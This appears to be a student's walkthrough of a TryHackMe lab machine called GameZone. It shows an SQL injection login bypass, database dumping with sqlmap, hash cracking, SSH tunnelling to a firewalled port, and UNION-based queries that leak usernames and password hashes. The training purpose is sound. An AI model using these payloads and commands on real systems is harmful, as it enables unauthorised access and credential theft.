**Learn to hack into this machine. Understand how to use SQLMap, crack  some passwords, reveal services using a reverse SSH tunnel and escalate  your privileges to root!**

# Obtain access via SQLi

## Manually

In this task you will understand more about SQL (structured query  language) and how you can potentially manipulate queries to communicate  with the database.

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

**`SELECT \* FROM users WHERE username = :username AND password := password`**

In our GameZone machine, when you attempt to login, it will take your  inputted values from your username and password, then insert them  directly into the query above. If the query finds data, you'll be  allowed to login otherwise it will display an error message.

Here  is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute  it.

​                                                            

Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: **' or 1=1 -- -** it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

**SELECT \* FROM users WHERE username = admin AND password := ' or 1=1 -- -**

The extra SQL we inputted as our password has changed the above query to  break the initial query and proceed (with the admin user) if 1==1, then  comment the rest of the query to stop it breaking.

​                                                            

GameZone doesn't have an admin user  in the database, however you can still login without knowing any  credentials using the inputted password data we used in the previous  question.

Use **' or 1=1 -- -** as your username and leave the password blank.

## Using SQLMap

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of [Kali Linux](https://tryhackme.com/rooms/kali) or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..)  and SQLMap automates the whole process trying different techniques.

​                                                            

We're going to use SQLMap to dump the entire database for GameZone.

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).

 ![img](https://i.imgur.com/ox4wJVH.png)

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

```shell
sqlmap -r request.txt --dbms=mysql --dump
```

**-r** uses the intercepted request you saved earlier
**--dbms** tells SQLMap what type of database management system it is
**--dump** attempts to outputs the entire database

![img](https://i.imgur.com/iiQ7g9t.png)

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

# Cracking a password with JohnTheRipper                            

Once you have JohnTheRipper installed you can run it against your hash using the following arguments:

![img](https://i.imgur.com/64g6Y8F.png)

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.

# Exposing services with reverse SSH tunnels                            

![img](https://i.imgur.com/cYZsC8p.png)

Reverse SSH port forwarding specifies that the given port on the remote server  host is to be forwarded to the given host and port on the local side.

**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can  forward the traffic to a server you own and view it. For example, if  imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.

**-R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in  reverse.

We will use a tool called **ss** to investigate sockets running on a host.

If we run **ss -tulpn** it will tell us what socket connections are running

| **Argument** | **Description**                    |
| ------------ | ---------------------------------- |
| -t           | Display TCP sockets                |
| -u           | Display UDP sockets                |
| -l           | Displays only listening sockets    |
| -p           | Shows the process using the socket |
| -n           | Doesn't resolve service names      |

We can see that a service running on port 10000 is blocked via a  firewall rule from the outside (we can see this from the IPtable list).  However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run **ssh -L 10000:localhost:10000 <username>@<ip>**

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.



# Manually sql command

Let's find out how many columns are being selected in the intended query so we concatenate it with a UNION:

```sql
' UNION select 1 from information_schema.tables #
' UNION select 1,2 from information_schema.tables #
' UNION select 1,2,3 from information_schema.tables #
```

![image-20220423165321264](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220423165321264.png)

The first two queries above will return errors stating that the two select statements in the query are different. The last one will not error out but will return a 2 and 3 which means that the number of columns being selected is 3 (the first selection in the table is not being echoed from PHP).

From this, we can get all of the table names now and then see if we can get any sensitive information in order to access the system with this:

```sql
' UNION select 1,table_schema,table_name from information_schema.tables #
```

![image-20220423165513179](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220423165513179.png)

Looking through the output we can see that we have a post and users table

The users table sounds interesting. Usually a table with that name will have usernames and hashes in them so we will try and leak those.

We, now, need to find out the name of the columns for that table:

```sql
' UNION select 1,table_name,column_name from information_schema.columns #
```

![image-20220423165800549](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220423165800549.png)

This will output all of the column names with their associated tables.

We can see two interesting columns within the users table: username and pwd. Let's leak those columns:

```sql
' UNION select 1,username,pwd from users #
```

![image-20220423165911691](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220423165911691.png)